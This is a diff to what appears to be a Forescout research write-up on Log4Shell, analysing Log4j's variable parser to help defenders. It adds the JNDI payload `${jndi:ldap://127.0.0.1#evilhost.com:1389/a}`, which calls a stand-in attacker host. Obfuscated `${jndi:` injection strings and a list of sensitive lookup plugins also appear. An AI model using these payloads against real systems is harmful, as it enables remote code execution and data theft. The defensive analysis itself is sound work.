@@ -47,6 +47,7 @@ A (non-exhaustive) list of exploit examples coming from the sources above and so
 	*	`${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attacker_controled_website/payload_to_be_executed}`
 	*	`${${::-j}ndi:`
 	*	`${${::-j}nd${::-i}:`
+	*	`${jndi:ldap://127.0.0.1#evilhost.com:1389/a}`
 
 Notice that most (if not all) of these examples come from analyzing attack attempts seen in the wild, which is very valuable and provides immediate action for defenders. However, the list includes some examples which are not valid exploits (remember that attackers are spraying the Internet with potentially automatically generated exploit tests) and, more importantly, a list of examples does not provide a comprehensive understanding or explanations of how attackers could find new obfuscation techniques, which is critically important to designing defense mechanisms. In the description below, we analyze the Log4j variable parser to understand what exploits are valid and describe examples of new, valid obfuscation techniques that we have tested in our lab. 
 
@@ -91,7 +92,7 @@ Attackers can also access sensitive data using other plugins such as `${env` (se
  
 An example of the `${env` variable usage in the wild was provided by [Sean Gallagher of Sophos](https://news.sophos.com/en-us/2021/12/12/log4shell-hell-anatomy-of-an-exploit-outbreak/).
 
-We believe that, apart from JNDI, there are multiple sensitive plugins that can be used by attackers, including, but not limited to `${main` , `${ctx`, `${env`, `${mdc`, `${spring`, `${sys`, `${web`, `${k8s`, `${java`, `${docker`, `${map`. To limit the potential exposure, such plugins must be disabled if not used (see [Log4j Configuration](https://logging.apache.org/log4j/2.x/manual/configuration.html)).
+We believe that, apart from JNDI, there are multiple sensitive plugins that can be used by attackers, including, but not limited to `${main` , `${ctx`, `${env`, `${mdc`, `${spring`, `${sys`, `${web`, `${k8s`, `${java`, `${docker`, `${map`. To limit the potential exposure, such plugins must be disabled if not used (see [Log4j Configuration](https://logging.apache.org/log4j/2.x/manual/configuration.html)). The effects might range from information disclosure to a DoS.
 
 
 New exploit obfuscation by Forescout Research Labs
